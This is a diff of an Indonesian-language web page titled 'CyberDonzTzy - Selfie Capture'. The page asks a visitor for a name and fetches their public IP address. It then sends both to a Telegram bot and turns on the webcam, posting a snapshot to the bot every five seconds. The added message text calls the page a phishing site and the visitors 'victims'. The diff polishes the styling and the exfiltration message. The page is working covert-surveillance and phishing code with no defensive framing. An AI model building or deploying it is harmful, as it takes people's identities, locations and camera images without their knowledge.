@@ -2,82 +2,90 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>SelfCam Capture</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CyberDonzTzy - Selfie Capture</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
   <style>
+    * {
+      margin: 0; padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
     body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: #0f172a;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      background: linear-gradient(145deg, #0f172a, #1e293b);
+      color: #ffffff;
       height: 100vh;
-      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
-
     #loader {
-      position: absolute;
-      width: 100%;
-      height: 100%;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
       background: #0f172a;
       display: flex;
       justify-content: center;
       align-items: center;
+      z-index: 999;
       font-size: 24px;
-      animation: fadeOut 1s ease-out 3s forwards;
+      animation: fadeOut 1s ease-out 2.5s forwards;
     }
-
     @keyframes fadeOut {
       to { opacity: 0; visibility: hidden; }
     }
-
     #app {
       opacity: 0;
       transform: scale(0.9);
-      transition: all 1s ease-in-out 3s;
+      transition: all 1s ease-in-out 2.5s;
+      width: 90%;
+      max-width: 400px;
     }
-
     #app.visible {
       opacity: 1;
       transform: scale(1);
     }
-
     .card {
       background: #1e293b;
       padding: 30px;
-      border-radius: 12px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px #00000050;
       text-align: center;
-      box-shadow: 0 0 15px #00000080;
     }
-
-    input, button {
+    h2, h3 {
+      margin-bottom: 20px;
+    }
+    input {
       width: 100%;
       padding: 12px;
-      margin-top: 15px;
+      margin-bottom: 15px;
       border: none;
-      border-radius: 6px;
-      font-size: 16px;
-    }
-
-    input {
+      border-radius: 8px;
       background: #334155;
       color: #fff;
+      font-size: 16px;
     }
-
     button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
       background: #10b981;
       color: #fff;
-      cursor: pointer;
       font-weight: bold;
+      font-size: 16px;
+      transition: background 0.3s;
+      cursor: pointer;
     }
-
+    button:hover {
+      background: #059669;
+    }
     video {
       margin-top: 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px #00000066;
+      border-radius: 16px;
+      box-shadow: 0 0 15px #00000066;
+      width: 100%;
     }
-
     canvas {
       display: none;
     }
@@ -88,14 +96,15 @@
 
   <div id="app">
     <div class="card" id="formCard">
-      <h2>Masukkan Nama Anda</h2>
+      <h2>Selamat Datang</h2>
+      <p>Masukkan nama Anda untuk melanjutkan:</p>
       <input type="text" id="nameInput" placeholder="Nama Anda..." />
-      <button onclick="startCapture()">Get Started</button>
+      <button onclick="startCapture()">Mulai</button>
     </div>
 
     <div class="card" id="cameraCard" style="display:none;">
       <h3>Welcome To CyberDonzTzy</h3>
-      <video id="video" width="320" autoplay muted playsinline></video>
+      <video id="video" autoplay muted playsinline></video>
       <canvas id="canvas" width="320" height="240"></canvas>
     </div>
   </div>
@@ -107,7 +116,7 @@
     window.onload = () => {
       setTimeout(() => {
         document.getElementById("app").classList.add("visible");
-      }, 3000);
+      }, 2500);
     };
 
     async function startCapture() {
@@ -117,7 +126,6 @@
       document.getElementById("formCard").style.display = "none";
       document.getElementById("cameraCard").style.display = "block";
 
-      // Ambil IP publik
       let ip = "Tidak diketahui";
       try {
         const res = await fetch("https://api.ipify.org?format=json");
@@ -127,15 +135,19 @@
         console.warn("Gagal ambil IP:", e);
       }
 
-      // Kirim info ke Telegram
-      const infoMsg = `Pengguna masuk:\nNama: ${name}\nIP: ${ip}`;
+      const infoMsg = `
+𝐊𝐨𝐫𝐛𝐚𝐧 𝐌𝐚𝐬𝐮𝐤 𝐉𝐞𝐛𝐚𝐤𝐚𝐧 𝐖𝐞𝐛 𝐏𝐡𝐢𝐬𝐢𝐧𝐠 𝐃𝐨𝐧𝐳𝐓𝐳𝐲
+──────────────────────────────
+𝗡𝗮𝗺𝗮 : ${name}
+𝗔𝗹𝗮𝗺𝗮𝘁 𝗜𝗽 𝗞𝗼𝗿𝗯𝗮𝗻 : ${ip}
+𝗙𝗼𝘁𝗼 𝗞𝗼𝗿𝗯𝗮𝗻 𝗔𝗸𝗮𝗻 𝗗𝗶 𝗞𝗶𝗿𝗶𝗺 𝟱 𝗗𝗲𝘁𝗶𝗸 𝗟𝗮𝗴𝗶!!!
+──────────────────────────────`;
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: infoMsg })
       });
 
-      // Akses kamera
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
       const ctx = canvas.getContext("2d");
@@ -143,6 +155,7 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
+        await video.play();
 
         setInterval(() => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -157,8 +170,9 @@
             method: "POST",
             body: formData
           });
-        }, 5000); // kirim tiap 5 detik
+        }, 5000);
       } catch (err) {
+        console.error("Gagal akses kamera:", err);
         alert("Gagal mengakses kamera: " + err.message);
       }
     }
